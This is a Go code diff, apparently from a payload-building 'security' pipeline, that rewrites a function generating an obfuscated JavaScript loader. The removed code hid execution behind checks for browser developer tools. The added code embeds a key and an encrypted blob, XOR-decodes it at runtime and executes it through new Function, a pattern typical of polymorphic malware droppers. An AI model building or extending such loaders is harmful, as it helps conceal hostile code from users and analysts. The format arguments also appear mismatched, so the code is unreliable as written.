@@ -1,7 +1,6 @@
 package security
 
 import (
-	crand "crypto/rand"
 	"encoding/base64"
 	"fmt"
 	mrand "math/rand" // Alias math/rand to avoid conflicts
@@ -152,37 +151,30 @@ func (p *Pipeline) addPolymorphicLayer(code []byte) []byte {
 
 // New advanced loader
 func (p *Pipeline) addAdvancedLoader(encrypted []byte) []byte {
-	key := make([]byte, 32)
-	crand.Read(key) // Use crand for cryptographic operations
-
 	loader := fmt.Sprintf(`
     (function(){
-        const _0x%x = %q;
-        const _0x%x = %q;
-        
-        function decode(str) {
-            // Complex decoding logic here
-            return str;
-        }
-        
-        function verify() {
-            return (
-                !window.Firebug && 
-                !window.__REACT_DEVTOOLS_GLOBAL_HOOK__ &&
-                !window.__REDUX_DEVTOOLS_EXTENSION__ &&
-                window.chrome === undefined
-            );
-        }
-        
-        if(verify()) {
-            const payload = decode(_0x%x);
+        try {
+            // Decryption key from server
+            const key = "%s";
+            
+            // Helper functions
+            const decode = (str) => {
+                const decoded = atob(str);
+                return decoded.split('').map(c => 
+                    String.fromCharCode(c.charCodeAt(0) ^ %d)
+                ).join('');
+            };
+
+            // Decrypt and execute
+            const payload = decode(%q);
             (new Function(payload))();
+        } catch(e) {
+            console.error("Decryption error:", e);
         }
     })();
-    `,
-		mrand.Int31(), key,
-		mrand.Int31(), encrypted,
-		mrand.Int31())
+    `, base64.StdEncoding.EncodeToString(p.encryptor.key),
+		mrand.Int31(),
+		base64.StdEncoding.EncodeToString(encrypted))
 
 	return []byte(loader)
 }
